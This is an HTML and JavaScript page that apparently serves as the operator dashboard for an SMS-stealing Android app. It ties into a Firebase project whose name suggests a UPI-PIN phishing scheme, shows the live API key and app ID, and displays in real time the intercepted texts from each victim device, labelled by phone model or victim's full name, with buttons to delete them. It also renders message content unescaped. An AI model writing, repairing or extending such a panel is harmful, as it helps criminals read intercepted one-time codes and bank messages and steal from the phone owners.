<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>All Device SMS (Realtime + Delete)</title>
  <style>
    body {font-family: Arial, sans-serif; margin: 40px;}
    h2 {margin-top: 30px;}
    .sms-card {background: #f9f9f9; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px;}
    .delete-btn {background: #d9534f; color: #fff; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer;}
    .delete-btn:hover {background: #c9302c;}
  </style>
</head>
<body>
  <h1>All Devices SMS (Realtime)</h1>
  <div id="content">Loading...</div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAsXFp45tGYHCEZ-z4uYR8o1MYb3EhLTZg",
      authDomain: "dmart-upipin-1457-8-8-25.firebaseapp.com",
      projectId: "dmart-upipin-1457-8-8-25",
      storageBucket: "dmart-upipin-1457-8-8-25.firebasestorage.app",
      messagingSenderId: "391446281272",
      appId: "1:391446281272:android:19f745ba7d7dcd4b7e3acd",
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const container = document.getElementById('content');

    function render(snapshot) {
      container.innerHTML = '';
      const devices = snapshot.val() || {};

      Object.entries(devices).forEach(([deviceId, deviceData]) => {
        // Determine display name
        let name = deviceId;
        if (deviceData.DeviceInfo && deviceData.DeviceInfo.model) {
          name = deviceData.DeviceInfo.model;
        } else if (deviceData.input && deviceData.input.fullName) {
          name = deviceData.input.fullName;
        }

        // Device heading
        const h2 = document.createElement('h2');
        h2.innerText = name;
        container.appendChild(h2);

        // Show messages
        if (deviceData.sms) {
          Object.entries(deviceData.sms).forEach(([msgId, smsObj]) => {
            const card = document.createElement('div');
            card.className = 'sms-card';
            card.innerHTML = `
              <b>Sender:</b> ${smsObj.sender || ''}<br/>
              <b>Body:</b> ${smsObj.messageBody || ''}<br/>
              <b>Time:</b> ${smsObj.time || ''}<br/>
              <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
            `;
            container.appendChild(card);
          });
        } else {
          const p = document.createElement('p');
          p.innerText = 'No SMS found.';
          container.appendChild(p);
        }
      });
    }

    // Realtime listener for Devices
    db.ref('Devices').on('value', (snapshot) => {
      render(snapshot);
    });

    function deleteMsg(deviceId, msgId) {
      if (confirm('Delete this message?')) {
        db.ref(`Devices/${deviceId}/sms/${msgId}`).remove()
          .catch(e => alert("Error: " + e.message));
      }
    }
  </script>
</body>
</html>
